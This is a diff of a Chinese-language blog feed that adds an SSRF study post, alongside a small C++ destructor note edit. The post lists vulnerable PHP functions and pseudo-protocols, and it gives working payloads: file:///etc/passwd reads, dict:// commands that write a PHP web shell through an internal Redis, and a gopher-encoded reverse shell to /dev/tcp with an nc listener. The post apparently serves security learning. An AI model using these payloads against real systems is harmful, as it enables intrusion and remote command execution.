@@ -10,9 +10,117 @@
         </author>
         <description>bug依旧很多，反正我忍不了</description>
         <language>zh-cn</language>
-        <pubDate>Fri, 28 Mar 2025 20:39:27 +0800</pubDate>
-        <lastBuildDate>Fri, 28 Mar 2025 20:39:27 +0800</lastBuildDate>
+        <pubDate>Sun, 06 Apr 2025 23:02:54 +0800</pubDate>
+        <lastBuildDate>Sun, 06 Apr 2025 23:02:54 +0800</lastBuildDate>
         <category term="《舰舰的奇妙冒险》" />
+        <item>
+            <guid isPermalink="true">https://zhewanyiershinicheng.github.io/2025/04/06/SSRF/</guid>
+            <title>SSRF</title>
+            <link>https://zhewanyiershinicheng.github.io/2025/04/06/SSRF/</link>
+            <category term="技术" scheme="https://zhewanyiershinicheng.github.io/tags/%E6%8A%80%E6%9C%AF/" />
+            <pubDate>Sun, 06 Apr 2025 23:02:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1743952653208.png&#34; alt=&#34;1743952653208&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以从 URL 关键字中寻找漏洞&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;share   通常表示分享功能&lt;br /&gt;
+ wap   表示这是针对移动设备优化的版本&lt;br /&gt;
+ url   通常用于重定向&lt;br /&gt;
+ link   获取某个东西&lt;br /&gt;
+ src   就是 src&lt;br /&gt;
+source   指定数据来源&lt;br /&gt;
+ target   用于指定表单提交后用于处理的文件&lt;br /&gt;
+ u	url 的简写&lt;br /&gt;
+ display	控制图片显示方式&lt;br /&gt;
+ sourceURL	待下载文件的地址&lt;br /&gt;
+ imageURL	指定页面显示的图片的地址&lt;br /&gt;
+ domain	后跟域名&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;产生漏洞的函数 PHP&lt;br /&gt;
+&lt;strong&gt;file_get_contents()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;-- 支持 php://input 协议&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;sockopen()/fsockopen()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;-- 这个函数用于获取指定的 url 的数据，文件或者 html。使用 socket 建立 tcp 链接。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;curl_exec()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;-- 通过 PHP 获取文件 / 数据，下载到 curled 文件夹，附加随机数和 txt 扩展名&lt;/p&gt;
+&lt;p&gt;-- 默认不跟踪跳转，用于执行指定的 url 对话&lt;/p&gt;
+&lt;p&gt;伪协议&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;file:/// 从文件系统中获取文件内容，如，file:///etc/passwd&lt;br /&gt;
+dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：&lt;br /&gt;
+sftp:// SSH 文件传输协议或安全文件传输协议&lt;br /&gt;
+ ldap:// 轻量级目录访问协议，或者 ldaps://,Idapi://&lt;br /&gt;
+tftp:// 简单文件传输协议&lt;br /&gt;
+ gopher:// 分布式文档传递服务，可使用 gopherus 生成 payload&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;fopen()&lt;/strong&gt;&lt;br /&gt;
+&lt;strong&gt;readfile()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;利用的协议：&lt;/p&gt;
+&lt;p&gt;要求目标服务器可以接收用户指定的 URL 并发起请求&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;（1）file：在有回显的情况下，利用 file 协议可以读取服务器本地的任意内容
+例如：
+将file:///etc/passwd作为参数提交给该接口，服务器就会尝试读取 /etc/passwd 文件的内容，并将结果返回给攻击者（如果存在回显）
+
+（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等
+语法是：
+dict://&amp;lt;server&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;database identifier&amp;gt;/&amp;lt;search query&amp;gt;
+一些服务响应dict请求会返回自身信息，所以泄露。也可以用于探测端口是否开放 (只构造到dict://&amp;lt;target_ip&amp;gt;:&amp;lt;port&amp;gt;/)。通常只是为已知漏洞做准备。
+
+（3）gopher：gopher支持发出GET、POST请求,可用于反弹shell
+语法是：
+gopher://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;selector，也就是执行的操作，格式有很多种&amp;gt;
+
+
+（4）http/s：探测内网主机存活，也可以用于探测端口是否开放
+例如：
+构造 http://192.168.1.100:80 这样的 URL 提交给 SSRF 接口，观察服务器的响应来判断 192.168.1.100 的 80 端口是否开放以及是否有 Web 服务在运行。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;更进一步的：&lt;/p&gt;
+&lt;p&gt;一:dict&lt;/p&gt;
+&lt;p&gt;Redis 是一个常用的内存数据库，dict 可以模拟 Redisd 协议格式，通过向内网中的 Redis 服务器发送请求，如果该服务器没有访问控制等，可以执行一些 Redis 命令&lt;/p&gt;
+&lt;p&gt;一个流程&lt;/p&gt;
+&lt;p&gt;1. 构造  &lt;code&gt;dict://&amp;lt;内网 Redis IP&amp;gt;:6379/INFO&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;返回版本等信息&lt;/p&gt;
+&lt;p&gt;2. 构造 &lt;code&gt;dict://192.168.1.100:6379/CONFIG%20SET%20dir%20/var/www/html&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;修改数据存储目录&lt;/p&gt;
+&lt;p&gt;3. 构造 &lt;code&gt;dict://192.168.1.100:6379/SET%20shell.php%20%22%3C?php%20system(%24_GET%5B%27cmd%27%5D);?%3E%22 &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用 SET 写入 &amp;lt;?php system ($_GET [&#39;cmd&#39;]);?&amp;gt;&lt;/p&gt;
+&lt;p&gt;4. 构造 &lt;code&gt;dict://192.168.1.100:6379/SAVE&lt;/code&gt; , 持久化数据&lt;/p&gt;
+&lt;p&gt;5. 访问  &lt;code&gt;http://目标网站域名/shell.php?cmd=ls&lt;/code&gt; ，&lt;/p&gt;
+&lt;p&gt;使用刚刚的脚本&lt;/p&gt;
+&lt;p&gt;这个流程也适用于  &lt;code&gt;gopher&lt;/code&gt;  协议请求&lt;/p&gt;
+&lt;p&gt;但是使用 Redis 命令要前加一个_，最后要以 %0D%0A 结尾&lt;/p&gt;
+&lt;p&gt;例如保存那个要改为：gopher://&amp;lt;Redis 服务器 IP&amp;gt;:6379/_SAVE%0D%0A&lt;/p&gt;
+&lt;p&gt;二:gopher&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gopher&lt;/code&gt;  协议反弹 shell：&lt;/p&gt;
+&lt;p&gt;这是利用已经存在的命令执行漏洞，可以是 web 或者 PHP 上的。&lt;/p&gt;
+&lt;p&gt;作用是将命令执行的结果返回到你监听的端口处。&lt;/p&gt;
+&lt;p&gt;例如命令执行漏洞如果在 &lt;code&gt;vulnerable.php&lt;/code&gt; ：&lt;/p&gt;
+&lt;p&gt;先构造一个正常的 POST 请求&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /vulnerable.php HTTP/1.1
+Host: &amp;lt;目标主机&amp;gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+
+cmd=&amp;lt;?php system(&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.100/4444 0&amp;gt;&amp;amp;1&amp;quot;);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后转化为  &lt;code&gt;gopher&lt;/code&gt;  协议格式&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;将上述 HTTP 请求转换为  &lt;code&gt;gopher&lt;/code&gt;  协议的 `` 部分，需要注意以下几点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;每个换行符（ &lt;code&gt;\n&lt;/code&gt; ）在  &lt;code&gt;gopher&lt;/code&gt;  协议中通常用  &lt;code&gt;%0D%0A&lt;/code&gt;  表示（ &lt;code&gt;\r\n&lt;/code&gt;  的 URL 编码）。&lt;/li&gt;
+&lt;li&gt;空格用  &lt;code&gt;%20&lt;/code&gt;  表示。&lt;/li&gt;
+&lt;li&gt;特殊字符需要进行 URL 编码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;#这也是在构造复杂请求，你也可以截获请求，然后篡改，或者模拟正常用户。
+转化后：
+gopher://&amp;lt;目标主机&amp;gt;:80/_POST%20/vulnerable.php%20HTTP/1.1%0D%0AHost:%20&amp;lt;目标主机&amp;gt;%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2068%0D%0A%0D%0Acmd%3D%3C%3Fphp%20system(%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%22);%3F%3E
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后监听下 4444 端口：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;     //这什么玩意儿？？？&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这样反向连接成功后，就可以在目标主机上执行命名（起码比一直构造好 php 好了很多）&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gopher&lt;/code&gt;  协议攻击内网服务：&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://zhewanyiershinicheng.github.io/2025/03/28/docker/</guid>
             <title>docker</title>
@@ -113,7 +221,7 @@ public:
 &lt;p&gt;来显式指定生成默认的构造函数&lt;/p&gt;
 &lt;p&gt;另外，const 可以作为构造函数的重载区分，当定义的对象是 const 类型，它才会被自动调用。&lt;/p&gt;
 &lt;p&gt;析构函数&lt;/p&gt;
-&lt;p&gt;没有参数，不可重载，都是先入后出（同生存期时，包括对象数组），这是因为后面定义的对象析构时可能访问已销毁的前面的对象，所以这是 C++ 的标准要求的，跟怎么存储没有关系。&lt;/p&gt;
+&lt;p&gt;没有参数，不可重载，都是先入后出（同生存期时，包括对象数组），这是因为后面定义的对象析构时可能访问已销毁的前面的对象，所以这是 C++ 的标准要求的，跟怎么存储没有关系。还有就是，如果堆上的对象不是手动释放，在程序结束后&lt;strong&gt;不会调用析构函数&lt;/strong&gt;，而是被操作系统直接回收。&lt;/p&gt;
 &lt;p&gt;3. 关于成员函数 &amp;amp; const&amp;amp;static&lt;/p&gt;
 &lt;p&gt;常成员函数：&lt;/p&gt;
 &lt;p&gt;属于对象，不能通过  &lt;code&gt;this&lt;/code&gt;  指针修改调用对象的非常数据成员 ，但是可以使用外部的数据 / 函数&lt;/p&gt;
